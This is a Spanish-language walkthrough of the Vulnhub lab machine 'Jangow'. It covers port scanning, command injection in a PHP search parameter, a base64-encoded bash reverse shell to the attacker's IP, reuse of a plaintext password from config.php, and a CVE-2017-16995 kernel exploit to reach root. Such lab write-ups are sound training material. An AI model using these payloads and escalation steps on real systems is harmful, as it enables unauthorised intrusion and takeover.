---
title: Vulnhub - Jangow
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'RCE', 'Kernel Exploitation (CVE-2017-16995)']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Jangow/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Jangow Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **RCE, Kernel Exploitation (CVE-2017-16995)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Jangow/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Jangow/02-versions.png)


c. Al inspeccionar le código fuente de la página llegamos a la ruta **http://<IP>/site/busque.php?buscar=**, en la cual podemos ejecutar comandos

![](/assets/images/Vulnhub/Easy/Jangow/03-command.png)


d. Existen varias formas de establecer una **reverse shell**, en este caso, **encodearemos el payload en base64, lo decodeamos y lo depositamos en un archivo**, para posteriormente, ejecutarlo.

🆚 Nos ponemos en escucha previamente con **nc**: **`nc -lvnp 443`**

* **Payload**

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/<Nuestra IP>/443 0>&1
    ```

* Lo encodeamos en base64 **base64 -w 0 payload**
* Urlencodemos el payload **echo -n "echo -n '<Payload en Base64>'|base64 -d>backup.sh" | jq -sRr @uri** y lo ejecutamos enviándolo con Burp Suite

![](/assets/images/Vulnhub/Easy/Jangow/04-payload.png)

* Por último, ejecutamos el script **bash%20backup.sh**

```
www-data@jangow01:/var/www/html/site/wordpress$
```

### Escalada de Privilegios 💹

a. Encontramos un archivo **config.php** con credenciales y existe otro usuario **jangow01**

```php
www-data@jangow01:/var/www/html/site/wordpress$ cat config.php 
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
<SNIP>
```

b. Nos convertimos en el usuario jangow01 con la contraseña **abygurl69**

```bash
www-data@jangow01:/var/www/html/site/wordpress$ su jangow01
Password: abygurl69
jangow01@jangow01:/var/www/html/site/wordpress$
```

c. Al listar la versión de kernel, vemos que es antiguo y es [vulnerable](https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c), copiamos el script y lo copiamos en una archivo en **`/tmp`**, lo compilamos con **`gcc exploit.c exploit`**, le damos permisos de ejecución **`chmod +x exploit`**, lo ejecutamos y seremos root

```bash
root@jangow01:/tmp# cat /root/proof.txt
<SNIP>
da39a3ee5e6b4b0d3255bfef95601890afd80709
```